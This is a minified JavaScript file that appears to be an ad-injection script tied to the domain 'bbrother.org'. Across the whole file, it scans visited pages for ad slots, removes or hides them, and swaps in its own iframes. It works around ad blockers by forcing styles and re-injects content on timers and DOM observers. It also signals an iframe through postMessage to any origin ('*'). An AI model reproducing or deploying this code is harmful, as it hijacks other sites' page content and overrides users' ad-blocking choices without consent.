!function(e){if(document.documentElement.getAttribute("iRAVSTRTtbr3123"))return 0;document.documentElement.setAttribute("iRAVSTRTtbr3123","1");var t={selectors:window.__selectors__,currentDom:document.location.host.replace("www.",""),getSelectors:function(){return{selectors:t.selectors,selectorString:t.selectors.join(", ")}},selectorClear:"bsssclsselc",hideAdvSoc:!(!window||!window.__shafora__||0==window.__shafora__),uidSet:"{{uid}}",getAdblock:function(){return!window||0!==window.__isAdblock__&&1!==window.__isAdblock__?0:1},getDomainSelectors:function(){return JSON.parse(atob("{{domainSels}}"))}},r=t.getSelectors().selectors,n={timing:0,observeDOM:function(e){var t=window.MutationObserver||window.WebKitMutationObserver;t&&new t(function(){e()}).observe(document,{childList:!0,characterData:!0,subtree:!0,characterDataOldValue:!0})},killBitch:function(){},guid:function(){function e(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return e()+e()+e()+e()+e()},setID:function(e,t){if(t||(t="scavid"),!e.getAttribute(t)){var r=n.guid();e.setAttribute(t,r)}},clear:function(){for(var e=document.querySelectorAll("iframe[data-block],.rubricator__banner,.DFPbanner__spacer,#ads_left,div.informerTop.js-informerTop, .Games_App__head span:nth-child(2), #main_content_wrap #latest_news #adriver-240x120, iframe[src*='rutrk.org/iframe/kadam-240x120'],#page_footer #bn-bot-wrap,body> div[style='position: fixed; left: 0px; top: 0px; width: 100%; height: 100%;'],#adriver-240x120,#adriver_210x67"),t=0;t<e.length;t++){var r=e[t];r.parentNode.removeChild(r)}},clearCss:function(e){if(window.self===window.top)try{var t=document.querySelector("html").shadowRoot.querySelectorAll("style"),r='::content body iframe[data-block],::content body> div[style="position: fixed; left: 0px; top: 0px; width: 100%; height: 100%;"]{max-height:0px !important;}',n="::content body ";r+=" "+n+" "+e.join(", "+n+" ")+"{visibility:hidden !important; opacity:0.01; display:block !important;}";for(var i=0;i<t.length;i++)t[i].innerHTML=r}catch(e){}},copyStyle:function(e){var r=t.getAdblock();try{if(!window||!window.getComputedStyle)return!1;var i=window.getComputedStyle(e,null).cssText+"visibility:visible !important;opacity:1 !important; height:auto !important;display:block !important; min-height:0 !important;";return r&&-1!=i.indexOf("absolute")&&!n.checkViewPort(e)&&(i=i.replace("absolute","static")),i}catch(e){return!1}},replaceRoot:function(e){if(t.getAdblock()){e.parentNode.style.overflow="visible";var r=n.copyStyle(e,1);if(!r)return!1;var i=document.createElement("div");i.setAttribute("style",r);var o=0;if(e.childNodes&&1==e.childNodes.length){var a=document.createElement("div"),d=n.copyStyle(e.childNodes[0]);a.setAttribute("style",d),i.appendChild(a),o=1}return e.replaceWith(i),n.calcWidthByParent(i,1),o&&n.calcWidthByParent(a),i}if(n.getHeight(e)>40)return e},hideAdv:function(e){n.clear();try{for(var r=document.querySelectorAll(e.join(", ")),i=0;i<r.length;i++){var o=n.replaceRoot(r[i]);o&&(t.getAdblock()?o.childNodes&&1==o.childNodes.length?(o.childNodes[0].setAttribute("class",t.selectorClear),n.setID(o.childNodes[0],"nnsel")):(o.setAttribute("class",t.selectorClear),n.setID(o,"nnsel")):(o.setAttribute("class",t.selectorClear),o.setAttribute("style",(o.getAttribute("style")?o.getAttribute("style"):"")+"visibility:visible !important; opacity:1 !important;"),n.setID(o,"nnsel")))}}catch(e){}},calcWidthByParent:function(e,t){var r=n.getWidth(e.parentNode),i=window.getComputedStyle(e.parentNode),o=window.getComputedStyle(e),a=parseInt(o.marginLeft)+parseInt(o.marginRight),d=parseInt(i.paddingLeft)+parseInt(i.paddingRight);a+d&&(r=r-d-a),t&&(e.style.boxSizing="border-box"),e.style.width=r+"px"},getWidth:function(e){var t=e.clientWidth;return!t&&e.width&&(t=parseInt(e.width)),t},getHeight:function(e){var t=e.clientHeight;return!t&&e.height&&(t=parseInt(e.height)),t},checkViewPort:function(e){for(var t=e.offsetTop,r=e.offsetLeft,n=e.offsetWidth,i=e.offsetHeight;e.offsetParent;)t+=(e=e.offsetParent).offsetTop,r+=e.offsetLeft;return t<window.pageYOffset+window.innerHeight&&r<window.pageXOffset+window.innerWidth&&t+i>window.pageYOffset&&r+n>window.pageXOffset}};if(window.__isAdvEnabled__||t.hideAdvSoc){var i=t.getAdblock();if(n.clear(),n.hideAdv(r),i){n.clearCss(r),n.hideAdv(r,i),n.killBitch();var o=setInterval(function(){n.killBitch()},100);n.observeDOM(function(){n.killBitch(),clearTimeout(n.timing),n.timing=setTimeout(function(){clearInterval(o),n.hideAdv(r),o=setInterval(function(){n.hideAdv(r)},100)},100)})}}var a=function(){this.paramsVal={},this.defParams={confirmDomain:""},this.protocol="http://",this.scanSelectorID={},this.scanSelectors=[],this.showAdv=1,this.checkSelector=function(r){if(!e.showAdv)return 1;if(t.getAdblock()){var i=r.parentNode;if((o=i.clientWidth)||(o=i.parentNode.clientWidth),o||(o=i.parentNode.parentNode.clientWidth),o>.9*window.innerWidth)return 1}else var o=n.getWidth(r);return!o||r.getAttribute("data-brtdav")||r.getAttribute("noscan")||o<120||!o&&!e.getHeight(r)},this.getWidth=function(e){return n.getWidth(e)},this.getHeight=function(e){var t=e.clientHeight;return!t&&e.height&&(t=parseInt(e.height)),t},this.setID=function(t,r){if(r||(r="scavid"),!t.getAttribute(r)){var n=e.helperFunct.guid();t.setAttribute(r,n),e.scanSelectorID[n]=n}},this.getProtocol=function(){var t=window.location.protocol;e.protocol=t+"//"},this.getAdsContainer=function(){e.scanSelectors=r},this.preScan=function(){e.getAdsContainer(),n.hideAdv(e.scanSelectors);for(var r=document.querySelectorAll("."+t.selectorClear),i=r.length,o=0;o<i;o++){var a=r[o];t.hideAdvSoc?a.style.display="none":a.getAttribute("data-brtdav")||a.getAttribute("noscan")||(a.setAttribute("scav",1),e.setID(a))}},this.sendScanPlace=function(){var r=document.querySelectorAll("*[scavid]");if(r.length){for(var i=[],o=0;o<r.length;o++){var a=r[o];if(!e.checkSelector(a))if(t.hideAdvSoc)a.style.display="none";else{var d=a.getAttribute("scavid");a.setAttribute("data-brtdav",d);var c=n.getWidth(a);c||(c=n.getWidth(a.parentNode)),c||(c=n.getWidth(a.parentNode.parentNode)),c||(c=n.getWidth(a.parentNode.parentNode.parentNode));var l={attr:d,width:c,height:parseInt(e.getHeight(r[o]))<200?0:r[o].clientHeight,adblock:t.getAdblock()};c&&i.push(l)}}i.length&&e.sendData("replaceDav|"+JSON.stringify(i))}},this.reloadInitByEl=function(r){var n=r.getAttribute("id");r.parentNode.setAttribute("data-brtdav",n);var i=[{attr:n,width:r.clientWidth,height:parseInt(e.getHeight(r))<200?0:r.clientHeight,adblock:t.getAdblock()}];e.sendData("replaceDav|"+JSON.stringify(i))},this.helperFunct={setEvent:function(e,t,r){if(t.addEventListener)t.addEventListener(e,r,!1);else if(t.attachEvent)return t.attachEvent("on"+e,r)},guid:function(){function e(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return e()+e()+e()+e()+e()}},this.getDefaultPlace=function(){var e=t.getDomainSelectors(),r=document.domain.replace("www.","");if(e[r]&&e[r].length)return e[r]},this.render={getStyle:function(e){var t="",r=window.getComputedStyle(e,null),n=["margin","padding","boxSizing","border","position","left","top","right","bottom","float"];for(var i in r)for(var o=0;o<n.length;o++)if(i==n[o]){var a=n[o];i&&r[i]&&(t+="boxSizing"==a?"box-sizing:"+r[i]+";":a+":"+r[i]+";")}return t+="background-color:#fff;margin-bottom:10px;z-index:10;"},realHeight:function(e){document.querySelector('iframe[src="'+decodeURIComponent(e.url)+'"]')&&(document.querySelector('iframe[src="'+decodeURIComponent(e.url)+'"]').style.height=e.h+"px",document.querySelector('iframe[src="'+decodeURIComponent(e.url)+'"]').style.width=e.w+"px")},reloadBlock:function(t){document.querySelector('iframe[src="'+decodeURIComponent(t.url)+'"]')&&e.reloadInitByEl(document.querySelector('iframe[src="'+decodeURIComponent(t.url)+'"]'))},renderDav:function(t){for(var r in t)t[r].attr=r,e.render.renderDavItem(t[r])},checkInViewPort:function(e){return n.checkViewPort(e)},reloadBlockInterval:function(t){if(window.reloadInterval&&parseFloat(window.reloadInterval))var r=parseInt(60*parseFloat(window.reloadInterval)*1e3),n=setInterval(function(){t&&e.render.checkInViewPort(t)&&(e.reloadInitByEl(t),clearInterval(n))},r)},renderDavItem:function(r){var i=document.querySelector('*[data-brtdav="'+r.attr+'"]');if(i&&r.iframe){var o=r.size.split("x"),a=i.parentNode,d=document.createElement("div"),c=document.createElement("iframe"),l=n.copyStyle(i);t.getAdblock()||(l+="display:inline-block !important;"),c.style.border="0",c.frameborder="0",c.style.width=o[0]+"px",c.style.margin="0 auto",c.style.display="block",c.style.position="static",c.style.left="auto",c.style.height=o[1]+"px",c.setAttribute("scrolling","no"),c.setAttribute("id",r.attr),document.getElementById(r.attr)&&document.getElementById(r.attr).parentNode.removeChild(document.getElementById(r.attr)),d.appendChild(c),a.insertBefore(d,i),a.removeChild(i),l+="background-color:#fff;margin-bottom:10px;",d.setAttribute("style",l),c.src=e.protocol+r.iframe,e.render.reloadBlockInterval(c)}},placeDefault:function(){var t=e.getDefaultPlace();if(t&&t.length)for(var r=0;r<t.length;r++)e.render.placeItemRenderDefault(t[r].s,t[r].pos,r,t[r].size,t[r].number)},placeItemRenderDefault:function(r,n,i,o,a){a||(a=0);var d=document.querySelectorAll(r);if(d.length)for(var c=0;c<d.length;c++){var l=d[c];if(!l.getAttribute("data-setbtrdav")){var s="defPlc"+i+c+a,u=e.render.getStyle(l),h=document.createElement("div");if(h.setAttribute("data-brtdav",s),h.setAttribute("data-brtdav-id",s),l.setAttribute("data-setbtrdav",1),a&&c%a!=0)return;switch(n){case"replace":if(t.hideAdvSoc){var f=document.createElement("div");l.parentNode.replaceChild(f,l)}else l.parentNode.replaceChild(h,l);break;case"append":t.hideAdvSoc||l.appendChild(h);break;case"before":t.hideAdvSoc||l.parentNode.insertBefore(h,l);break;case"after":t.hideAdvSoc||l.parentNode.insertBefore(h,l.nextSibling)}u.length&&h.setAttribute("style",u);var g=o.split("x"),p=[{attr:s,width:g[0],height:g[1],adblock:t.getAdblock()}];t.hideAdvSoc||e.sendData("replaceDav|"+JSON.stringify(p))}}}},this.frameSet=function(){e.helperFunct.setEvent("message",window,e.msgListern),e.sendScanPlace(),e.render.placeDefault(),setInterval(function(){e.preScan(),e.sendScanPlace()},3e3),setInterval(function(){e.render.placeDefault()},500)},this.msgListern=function(t){if(t&&t.origin&&-1!=t.origin.indexOf(e.paramsVal.confirmDomain)&&t.data){var r={},n=t.data.split("|");try{n.length>1&&(r=JSON.parse(n[1]))}catch(e){}e.switchCommand(n[0],r)}},this.switchCommand=function(t,r){switch(t){case"renderDav":e.render.renderDav(r);break;case"setHeight":e.render.realHeight(r);break;case"reloadBlockAdvBrt":e.render.reloadBlock(r);break;case"sendAdblock":e.getAdBlock(r)}},this.sendData=function(e){document.querySelector('iframe[src*="fi.html"]').contentWindow.postMessage(e,"*")},this.setParams=function(t){for(var r in e.defParams)e.paramsVal[r]=e.defParams[r];for(var r in t)e.paramsVal[r]=t[r]},this.construct=function(t){e.getProtocol(),e.setParams(t),e.preScan(),e.frameSet()};var e=this};if(window.iRAVSTRTtbr3123_i=new a,window.__isAdvEnabled__||t.hideAdvSoc)var d=setInterval(function(){try{document.querySelectorAll("body")&&document.querySelectorAll("body").length&&(clearInterval(d),window.iRAVSTRTtbr3123_i.construct(e))}catch(e){}},10)}({confirmDomain:"bbrother.org"});